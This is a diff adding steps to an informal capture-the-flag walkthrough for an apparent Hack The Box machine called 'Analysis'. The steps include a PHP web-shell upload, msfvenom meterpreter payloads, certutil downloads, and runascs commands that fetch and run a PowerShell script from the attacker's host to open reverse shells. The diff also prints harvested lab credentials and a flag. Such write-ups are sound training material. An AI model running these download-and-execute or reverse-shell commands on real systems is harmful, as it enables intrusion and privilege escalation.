@@ -153,3 +153,86 @@ Starting gobuster in directory enumeration mode
 
 so now we can use the the one of usernames that we found by kerbrute_linux_amd64 and the password we found using python script
 
+in Soc Report tab there is a option to upload a file,used PHP cmd from revshells.com
+
+to trigger it we need to  enter http://internal.analysis.htb/dashboard/uploads/revs.php
+
+and get the revshell
+
+made a payload using msfvenom:
+
+    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.125 LPORT=4444 -f exe -o revs.exe
+
+now need to upload it 
+
+opening python server to upload a file
+
+certutil -urlcache -f
+
+after several attempts we get the second reverse shell as analysis\svc_web
+
+in c:\inetpub\internal\employees>more login.php found some creds:
+    $username = "db_master";  
+    $password = '0$TBO7H8s12yh&';  
+    $database = "employees";
+
+in c:\inetpub\internal\users>more list.php found:
+    $ldap_password = 'N1G6G46G@G!j';
+    $ldap_username = 'webservice@analysis.htb';
+    $ldap_connection = ldap_connect("analysis.htb");
+
+using powershell to open a reverse shell as webservice https://github.com/antonioCoco/ConPtyShell/blob/master/Invoke-ConPtyShell.ps1
+
+opening a listener using:
+
+    stty raw -echo; (stty size; cat) | nc -lvnp 4243
+
+runascs.exe "webservice" "N1G6G46G@G!j" "powershell.exe -c IEX(IWR -UseBasicParsing 'http://10.10.16.125/Invoke-ConPtyShell.ps1'); Invoke-ConPtyShell -RemoteIp 10.10.16.125 -RemotePort 4243 -Rows 120 -Cols 38 -CommandLine cmd.exe" -d "analysis.htb"
+
+now we webservice
+
+we need to find a service to escalate a privileges
+
+https://github.com/itm4n/PrivescCheck
+
+we need to open another reverse shell as webservice and upload the ps script after that
+
+now when we uploaded it to machine,launch it using:
+    powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report PrivescCheck_$($env:COMPUTERNAME) -Format HTML"
+
+and let it run
+
+after it, it saves a file in html format, inside it there is a creds:
+    Domain   : analysis.htb.
+    Username : jdoe
+    Password : 7y4Z4^*y9Zzj
+
+creating another payload with another port 
+
+now running the same ConPtyShell script with new creds
+
+runascs.exe "jdoe" "7y4Z4^*y9Zzj" "powershell.exe -c IEX(IWR -UseBasicParsing 'http://10.10.16.125/Invoke-ConPtyShell.ps1'); Invoke-ConPtyShell -RemoteIp 10.10.16.125 -RemotePort 4243 -Rows 120 -Cols 38 -CommandLine cmd.exe" -d "analysis.htb"
+
+and we get a shell as jdoe
+
+cd c:\Users\jdoe\Desktop> and we get the user flag:
+
+a988c95c57815410c855e5ce17c160ca
+
+in C:\Snort\lib\snort_dynamicpreprocessor> we need to inject a payload with reverse shell to get admin privileges
+
+create once again,payload,ddl this time using:
+    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.125 LPORT=4445 -f dll -o sf_revs.dll
+
+setting msfconsole for this payload,run it
+
+uploading it via certutil -urlcache -f 
+
+now all we have to do is to wait a bit
+
+after 2 or so minutes, we have to get our reverse shell as admin
+
+
+
+
+
